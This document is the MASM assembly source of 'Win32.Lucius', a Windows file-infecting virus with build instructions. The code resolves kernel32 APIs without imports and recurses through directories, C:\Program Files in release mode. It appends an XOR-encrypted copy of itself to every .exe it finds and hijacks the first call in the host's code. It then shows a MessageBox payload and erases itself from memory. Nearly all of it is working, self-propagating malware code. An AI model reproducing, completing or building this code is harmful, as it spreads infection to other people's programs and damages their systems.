COMMENT &

Win32.Lucius
------------
by Kharn '07

A simple appending infector with random tail padding and first-call
hook infection method. Stream XOR cipher (key stored at head). Uses
stack for recursive infection of directories.

To build, use MASM and set code section to writeable.
	
BEGIN--
DO MASM
IF (-x "lucius.exe")
DO PEWRSEC
ENDIF
END--

&

__RELEASE__ equ 0

.586p
.model flat,stdcall
option casemap :none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\kernel32.lib

HEADER_SIZE equ virus_body - start_virus

VIRUS_SIZE equ end_virus - virus_body
ERASE_SIZE equ erase_self - start_virus

VIRUS_BODYSIZE equ end_virus - virus_body

.code

start_virus:

call GetNewDelta
	
GetNewDelta:
pop ebp
sub ebp,offset GetNewDelta
	
.if [ebp + key] == 0
	jmp virus_body
.endif

mov ecx,VIRUS_BODYSIZE
lea esi,[ebp + virus_body]
mov edi,esi

@@:
	lodsb
    push eax
    push ecx
    mov eax, [ebp + key]
    xor edx, edx
    mov ecx, 127773
    div ecx
    mov ecx, eax
    mov eax, 16807
    mul edx
    mov edx, ecx
    mov ecx, eax
    mov eax, 2836
    mul edx
    sub ecx, eax
    xor edx, edx
    mov eax, ecx
    mov [ebp + key], ecx
    mov edx,eax
    pop ecx
    pop eax

	;; okay, xor the byte.
	xor al,dl
	stosb
loop @B

jmp virus_body

	;; something's wrong here.

decryptor_key:	

key dd 0
	
virus_body:

	;; GetDelta moved up so rand will work.
	
find_kernel32:
push esi
xor eax, eax
assume fs:nothing
mov eax, fs:[eax+030h]
test eax, eax
js find_kernel32_9x
find_kernel32_nt:
mov eax, [eax + 0ch]
mov esi, [eax + 01ch]
lodsd
mov eax, [eax + 08h]
jmp find_kernel32_finished
find_kernel32_9x:
mov eax, [eax + 034h]
lea eax, [eax + 07ch]
mov eax, [eax + 03ch]
find_kernel32_finished:
pop esi

kernel32_found:
	
mov	[ebp + _Kernel32], eax
lea	esi, [ebp + __API_LoadLibrary]
call  GetFunctionAddress
mov [ebp + __ADDR_LoadLibrary],eax
	
mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GetCurrentProcess]
call GetFunctionAddress
mov [ebp + __ADDR_GetCurrentProcess],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_SetPriorityClass]
call GetFunctionAddress
mov [ebp + __ADDR_SetPriorityClass],eax
	
mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_FindFirstFile]
call GetFunctionAddress
mov [ebp + __ADDR_FindFirstFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_SetCurrentDirectory]
call GetFunctionAddress
mov [ebp + __ADDR_SetCurrentDirectory],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GetFileAttributes]
call GetFunctionAddress
mov [ebp + __ADDR_GetFileAttributes],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_FindNextFile]
call GetFunctionAddress
mov [ebp + __ADDR_FindNextFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_FindClose]
call GetFunctionAddress
mov [ebp + __ADDR_FindClose],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GlobalAlloc]
call GetFunctionAddress
mov [ebp + __ADDR_GlobalAlloc],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GlobalFree]
call GetFunctionAddress
mov [ebp + __ADDR_GlobalFree],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CreateFile]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_CreateFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GetTickCount]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_GetTickCount],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CreateMutex]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_CreateMutex],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_OpenMutex]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_OpenMutex],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_ReleaseMutex]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_ReleaseMutex],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_GetFileSize]
call GetFunctionAddress
mov dword ptr [ebp + __ADDR_GetFileSize],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CreateFileMapping]
call GetFunctionAddress
mov [ebp + __ADDR_CreateFileMapping],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_MapViewOfFile]
call GetFunctionAddress
mov [ebp + __ADDR_MapViewOfFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_UnmapViewOfFile]
call GetFunctionAddress
mov [ebp + __ADDR_UnmapViewOfFile],eax

mov eax, [ebp + _Kernel32]
lea esi, [ebp + __API_CloseHandle]
call GetFunctionAddress
mov [ebp + __ADDR_CloseHandle],eax

jmp found_all

GetFunctionAddress:
	mov	ebx, [eax + 3Ch]
	add	ebx, eax
	add	ebx, 120
	mov	ebx, [ebx]
	add	ebx, eax
	xor	edx, edx
	mov	ecx, [ebx + 32]
	add	ecx, eax
	push	esi
	push	edx
 
CompareNext:
	pop	edx
	pop	esi
	inc	edx
	mov	edi, [ecx]
	add	edi, eax
	add	ecx, 4
	push	esi
	push	edx
 
CompareName:
	mov	dl, [edi]
	mov	dh, [esi]
	cmp	dl, dh
	jne	CompareNext
	inc	edi
	inc	esi
	cmp	byte ptr [esi], 0
	je	GetAddress
	jmp	CompareName
 
GetAddress:
	pop	edx
	pop	esi
	dec	edx
	shl	edx, 1
	mov	ecx, [ebx + 36]
	add	ecx, eax
	add	ecx, edx
	xor	edx, edx
	mov	dx, [ecx]
	shl	edx, 2
	mov	ecx, [ebx + 28]
	add	ecx, eax
	add	ecx, edx
	add	eax, [ecx]
 
	ret

random:	
    mov eax, [ebp + seed]
    xor edx, edx
    mov ecx, 127773
    div ecx
    mov ecx, eax
    mov eax, 16807
    mul edx
    mov edx, ecx
    mov ecx, eax
    mov eax, 2836
    mul edx
    sub ecx, eax
    xor edx, edx
    mov eax, ecx
    mov [ebp + seed], ecx
    ret
	
found_all:

	;; seed the RNG
	mov eax,[ebp + __ADDR_GetTickCount]
	call eax
	mov [ebp + seed],eax

	;; okay, calculate the length of the decryptor we need.
	
	lea esi,[ebp + __STRING_RootInfect]
	push esi
	mov eax,[ebp + __ADDR_SetCurrentDirectory]
	call eax
	
	call UnifiedRecurse

	jmp payload
	
SetSelfPriority:

mov eax,[ebp + __ADDR_GetCurrentProcess]
call eax

mov ebx,[esp + 04h]

push ebx
push eax

mov eax,[ebp + __ADDR_SetPriorityClass]
call eax

ret

CheckExtension:

mov esi,ecx

@@:
	lodsb
	.if al == 0
	mov eax,-1
	jmp endCheck
	.elseif al == '.'
	jmp @F
	.endif
	jmp @B

@@:

	xor eax,eax
	mov al,'.'
	rol eax,8
	lodsb
	rol eax,8
	lodsb
	rol eax,8
	lodsb

	;; eax == 00112233 bytes

.if eax == '.exe'
mov eax,1
.else
mov eax,0
.endif

endCheck:
ret

UnifiedRecurse:
	;; Stack Structure:
	;; note the stack grows BACKWARDS
	;; ebx - 4 = HANDLE hFind
	;; ebx - 8 = STRUCT Win32_Find_Data
push ebx
mov ebx,esp
add esp,0FFFFFFF8h

push ebx
	push SIZEOF WIN32_FIND_DATA
	push GPTR
	mov eax,[ebp + __ADDR_GlobalAlloc]
	call eax
pop ebx
mov [ebx-8],eax

push ebx
push dword ptr [ebx - 8]
lea eax,[ebp + OFFSET __STRING_Dot_Star]
push eax
mov eax,[ebp + __ADDR_FindFirstFile]
	;; EBX == frame ptr (not ebp)
call eax
pop ebx

.if eax == 0
mov eax,-1
jmp finishRecurse
.endif
	
mov [ebx - 4h],eax
mov eax,[ebx - 8h]

	;; of course it's '.'. useless OS...
	
assume eax:ptr WIN32_FIND_DATA
.if byte ptr [eax].cFileName == '.'
	jmp @F
.endif
assume eax:nothing

@@:
push ebx
push dword ptr [ebx - 8]
mov eax,[ebx - 4]
push eax
mov eax,[ebp + __ADDR_FindNextFile]
call eax
pop ebx

.if eax == 0
mov eax,-1
jmp finishRecurse
.endif

mov eax,[ebx - 8h]
assume eax:ptr WIN32_FIND_DATA
lea ecx,[eax].cFileName
assume eax:nothing

	;; ecx = file name ptr

push ebx
push ecx
mov eax,[ebp + __ADDR_GetFileAttributes]
call eax
pop ebx
	
.if eax == FILE_ATTRIBUTE_DIRECTORY
	mov eax,[ebx - 8h]
	assume eax:ptr WIN32_FIND_DATA
	.if byte ptr [eax].cFileName == '.'
	jmp @B
	.else
	
	push ebx
	assume eax:ptr WIN32_FIND_DATA
	lea ecx,[eax].cFileName
	push ecx
	mov eax,[ebp + __ADDR_SetCurrentDirectory]
	call eax
	pop ebx
	
	call UnifiedRecurse

	;; return to parent directory (maybe this is why it's stuffing up?
	push ebx
	lea ecx,[ebp + __STRING_DotDot]
	push ecx
	mov eax,[ebp + __ADDR_SetCurrentDirectory]
	call eax
	pop ebx

	.endif
	jmp @B
.else
	;; lulz begin teh snarfage
	push ebx
	mov eax,[ebx - 8h]
	pop ebx
	assume eax:ptr WIN32_FIND_DATA
	lea ecx,[eax].cFileName
	mov [ebp + __PTR_fileName],ecx
	call CheckExtension
	.if eax == 1
	push ebx

	;; infect the target file
	call InfectFile

	pop ebx
	.endif
	assume eax:nothing

.endif

jmp @B

finishRecurse:

mov esp,ebx
pop ebx
ret

InfectFile:

push NULL
push FILE_ATTRIBUTE_NORMAL
push OPEN_ALWAYS
push NULL
push FILE_SHARE_READ or FILE_SHARE_WRITE
push GENERIC_WRITE or GENERIC_READ
mov eax,[ebp + __PTR_fileName]
push eax
mov eax,[ebp + __ADDR_CreateFile]
call eax
mov [ebp + __HND_File],eax

.if eax == INVALID_HANDLE_VALUE
mov ebx,1
ret
.endif

xor ebx,ebx
	
push NULL
push eax
mov eax,[ebp + __ADDR_GetFileSize]

call eax
add eax,VIRUS_SIZE
add eax,1000h
mov [ebp + __max_size],eax

push 0
mov eax,[ebp + __max_size]
push eax
push 0
push PAGE_READWRITE
push NULL
mov eax,[ebp + __HND_File]
push eax
mov eax,[ebp + __ADDR_CreateFileMapping]
call eax
mov [ebp + __MAP_File],eax

push dword ptr [ebp + offset __max_size]
push 0
push 0
push FILE_MAP_WRITE
mov eax,[ebp  + __MAP_File]
push eax
mov eax,[ebp + __ADDR_MapViewOfFile]
call eax
mov [ebp + __PTR_File],eax

mov edi,eax
xor eax,eax
assume edi:ptr IMAGE_DOS_HEADER
mov ax,[edi].e_magic

add edi,[edi].e_lfanew

assume edi:ptr IMAGE_NT_HEADERS
add edi,SIZEOF DWORD
assume edi:ptr IMAGE_FILE_HEADER
xor ecx,ecx
mov cx,[edi].NumberOfSections
mov [ebp + totalSec],ecx

add edi,SIZEOF IMAGE_FILE_HEADER
mov [ebp + ptrOptHdr],edi
assume edi:ptr IMAGE_OPTIONAL_HEADER32
mov eax,[edi].CheckSum

.if eax == 0ffffh
mov eax,[ebp + __PTR_File]
push eax
mov eax,[ebp + __ADDR_UnmapViewOfFile]
call eax

mov eax,[ebp + __MAP_File]
push eax
mov eax,[ebp + __ADDR_CloseHandle]
call eax

mov eax,[ebp + __HND_File]
push eax
mov eax,[ebp + __ADDR_CloseHandle]
call eax

add esp,4	
ret
.endif

	mov eax,[edi].ImageBase
	mov [ebp + imgBase],eax
	mov eax,[edi].AddressOfEntryPoint
	mov [ebp + oldEP],eax

	add edi,sizeof IMAGE_OPTIONAL_HEADER32

	mov [ebp + sectionTable],edi

	mov edi,[ebp + sectionTable]
	mov ecx,[ebp + totalSec]
	mov edx,0
	mov ebx,0

	@@:
	.if ecx == 0
		jmp @F
	.endif

	assume edi:ptr IMAGE_SECTION_HEADER

	.if edx < [edi].PointerToRawData
	mov ebx,edi
	.endif
	
	add edi,sizeof IMAGE_SECTION_HEADER
	dec ecx
	jmp @B
	@@:

	mov edi,ebx
	mov eax,[ebp + ptrOptHdr]
	assume eax:ptr IMAGE_OPTIONAL_HEADER32

	mov ebx,[eax].FileAlignment
	mov [ebp + fileAlignment],ebx
	
	mov ebx,[eax].SectionAlignment
	mov [ebp + sectionAlignment],ebx
	assume eax:nothing

	mov eax,[ebp + __PTR_File]
	add eax,[edi].PointerToRawData
	add eax,[edi].Misc.VirtualSize
	mov [ebp + insertionPoint],eax

	mov eax,[edi].VirtualAddress
	add eax,[edi].Misc.VirtualSize
	mov [ebp + virtualInsertionPoint],eax
	
	mov eax,[edi].Misc.VirtualSize
	add eax,VIRUS_SIZE
	add eax,HEADER_SIZE
	mov [edi].Misc.VirtualSize,eax
	
	push edi
	mov edi,[ebp + ptrOptHdr]
	
	assume edi:ptr IMAGE_OPTIONAL_HEADER32	

	mov eax,[edi].SizeOfImage
	add eax,VIRUS_SIZE
	add eax,HEADER_SIZE

	pop edi

	assume edi:ptr IMAGE_SECTION_HEADER

	mov eax,[edi].SizeOfRawData
	add eax,VIRUS_SIZE
	add eax,HEADER_SIZE
	push eax

	xor edx,edx
	mov ebx,[ebp + fileAlignment]
	div ebx
	pop edx
	add eax,edx
	mov [edi].SizeOfRawData,eax

	assume edi:nothing

	mov edi,[ebp + insertionPoint]
	mov esi,start_virus
	add esi,ebp
	
	mov ecx,VIRUS_SIZE

mov ecx,decryptor_key - start_virus
rep movsb

mov eax,[ebp + seed]
stosd

add esi,4

mov ecx,VIRUS_BODYSIZE

@@:
	lodsb
	push eax
	push ecx
	mov eax, [ebp + seed]
	xor edx, edx
	mov ecx, 127773
	div ecx
	mov ecx, eax
	mov eax, 16807
	mul edx
	mov edx, ecx
	mov ecx, eax
	mov eax, 2836
	mul edx
	sub ecx, eax
	xor edx, edx
	mov eax, ecx
	mov [ebp + seed], ecx
	mov edx,eax
	pop ecx
	pop eax

	;; encrypt and store
	xor al,dl
	stosb
loop @B

mov [ebp + hookedCall],edi

mov edi,[ebp + sectionTable]
mov ecx,[ebp + totalSec]

nextSegtTable:	
	assume edi:ptr IMAGE_SECTION_HEADER
	.if ecx == 0
	or edi,0ffffffffh
	jmp doneSegtTable
	.endif
	mov eax,[ebp + oldEP]
	.if eax >= [edi].VirtualAddress
		mov ebx,[edi].VirtualAddress
		add ebx,[edi].Misc.VirtualSize
		.if eax < ebx
		mov [ebp + codeSegTableEntry],edi
		jmp doneSegtTable
		.endif
	.endif
	
	dec ecx
	add edi,sizeof IMAGE_SECTION_HEADER
	jmp nextSegtTable

doneSegtTable:
	mov ecx,[edi].SizeOfRawData
	mov eax,[edi].PointerToRawData
	push eax
	mov eax,[edi].VirtualAddress
	add eax,[ebp + imgBase]
	sub eax,[edi].PointerToRawData
	sub eax,[ebp + __PTR_File]
	mov [ebp + baseCallAddress],eax

	pop eax
	add eax,[ebp + __PTR_File]

	mov [ebp + cSeg],eax

	mov edi,eax
	xor eax,eax
	mov al,0e8h
	repne scasb

	dec edi
	add [ebp + baseCallAddress],edi

	inc edi
	mov esi,edi

	;; callReplace
	lodsd
	mov edx,[ebp + hookedCall]
	mov [ebp + hookedCall],eax
	
	;; redirect the call to the insertion point
	;; add ImageBase
	mov eax,[ebp + virtualInsertionPoint]
	add eax,[ebp + imgBase]
	sub eax,[ebp + baseCallAddress]
	sub eax,5

	;; subtract current location from eax

	stosd

	push edi
	;; okey - this is the beginning of the header. we have HEADER_SIZE to
	;; write our return code in.
	
	mov eax,[ebp + baseCallAddress]
	add eax,[ebp + hookedCall]
	add eax,5
	mov [ebp + hookedCall],eax
	;; we can mov-jmp to this. we can preserve stack here.
	pop edi

	;; prepare to write return stub
	mov edi,edx
	
	push eax		; eax == hookedCall

	mov al,068h
	stosb

	pop eax			; eax == hookedCall
	;; okay, write the return code.
	stosd

	mov al,0C3h
	stosb

	;; okay, write random padding bytes here.

	@@:	
	call random
	mov ebx,11
	div ebx
	cmp edx,0
	je @F
	stosd
	jmp @B

	@@:	
	
mov eax,[ebp + __PTR_File]
push eax
mov eax,[ebp + __ADDR_UnmapViewOfFile]
call eax

mov eax,[ebp + __MAP_File]
push eax
mov eax,[ebp + __ADDR_CloseHandle]
call eax

mov eax,[ebp + __HND_File]
push eax
mov eax,[ebp + __ADDR_CloseHandle]
call eax
ret

xor_key dd 0
backup_key dd 0

firstSegtOffset dd 0
firstSegtVSize dd 0
firstSegtVOffs dd 0

firstSegtVSize_decr dd 0
firstSegtVOffs_decr dd 0

insertionPoint dd 0		; raddr of insertion point (copy)
virtualInsertionPoint dd 0	; vaddr of insertion point
baseCallAddress dd 0
hookedCall dd 0			; call we hooked for ??? profitz

firstSegtKey db 0

begin_APITable:	
__API_LoadLibrary db "LoadLibrary",0
__ADDR_LoadLibrary dd 0

__API_GetProcAddress db "GetProcAddress",0
__ADDR_GetProcAddress dd 0

__API_GlobalAlloc db "GlobalAlloc",0
__ADDR_GlobalAlloc dd 0

__API_GlobalFree db "GlobalFree",0
__ADDR_GlobalFree dd 0

__API_CreateFile db "CreateFile",0
__ADDR_CreateFile dd 0

__API_CreateFileMapping db "CreateFileMapping",0
__ADDR_CreateFileMapping dd 0

__API_MapViewOfFile db "MapViewOfFile",0
__ADDR_MapViewOfFile dd 0

__API_SetCurrentDirectory db "SetCurrentDirectory",0
__ADDR_SetCurrentDirectory dd 0

__API_GetCurrentProcess db "GetCurrentProcess",0
__ADDR_GetCurrentProcess dd 0

__API_SetPriorityClass db "SetPriorityClass",0
__ADDR_SetPriorityClass dd 0

__API_MessageBox db "MessageBox",0
__ADDR_MessageBox dd 0

__API_CreateMutex db "CreateMutex",0
__ADDR_CreateMutex dd 0

__API_OpenMutex db "OpenMutex",0
__ADDR_OpenMutex dd 0

__API_ReleaseMutex db "ReleaseMutex",0
__ADDR_ReleaseMutex dd 0

__API_UnmapViewOfFile db "UnmapViewOfFile",0
__ADDR_UnmapViewOfFile dd 0

__API_CloseHandle db "CloseHandle",0
__ADDR_CloseHandle dd 0

__API_GetTickCount db "GetTickCount",0
__ADDR_GetTickCount dd 0
	
__API_GetFileSize db "GetFileSize",0
__ADDR_GetFileSize dd 0

__API_FindFirstFile db "FindFirstFile",0
__ADDR_FindFirstFile dd 0

__API_GetFileAttributes db "GetFileAttributes",0
__ADDR_GetFileAttributes dd 0

__API_FindNextFile db "FindNextFile",0
__ADDR_FindNextFile dd 0

__API_FindClose db "FindClose",0
__ADDR_FindClose dd 0

end_APITable:	

__WSAData WSADATA <>
	
__DLL_User32 db "user32",0
__DLL_Wsock32 db "wsock32",0

__STRING_FileName db "petest.exe",0
__STRING_newdir db MAX_PATH dup(0)
__STRING_dotdot db "..",0
__STRING_filemask db "*.*",0

__HND_File dd 0
__MAP_File dd 0
__PTR_File dd 0

_User32 dd 0
_Kernel32 dd 0
_Wsock32 dd 0

totalSec dd 0
ptrOptHdr dd 0
oldEP dd 0
cSeg dd 0

imgBase dd 0
codeSegTableEntry dd 0

fileAlignment dd 0
sectionAlignment dd 0
deltaImage dd 0

seed dd 0
baseSeed dd 0
		
__STRING_Dot_Star db "*.*",0
__STRING_DotDot db "..",0

IF __RELEASE__
__STRING_RootInfect db "C:\Program Files\",0
ELSE
__STRING_RootInfect db "danger",0
ENDIF

virRet dd 0
	
__STRING_Dot_Exe db "*.exe",0
__STRING_Dot_Dot db "..",0

__PTR_fileName dd 0

__max_size dd 0

sectionTable dd 0

payload:

lea eax,[ebp + __DLL_User32]
push eax
mov eax,[ebp + __ADDR_LoadLibrary]
call eax
mov [ebp + _User32],eax

lea	esi, [ebp + __API_MessageBox]
call  GetFunctionAddress
mov [ebp + __ADDR_MessageBox],eax
	
push MB_OK
lea eax,[ebp + __STRING_PayloadTitle]
push eax
lea eax, [ebp + __STRING_Msg]
push eax
push 0
	
mov eax,[ebp + __ADDR_MessageBox]
push eax

lea edi, [ebp + offset start_virus]
mov ecx, ERASE_SIZE
mov al,0
rep stosb
erase_self:
	
pop eax
call eax
jmp end_virus
__STRING_PayloadTitle db "Win32.Lucius",0
__STRING_Msg db "...I am Lucius, Prince of Ruin...",0

end_virus:
invoke ExitProcess,0

end start_virus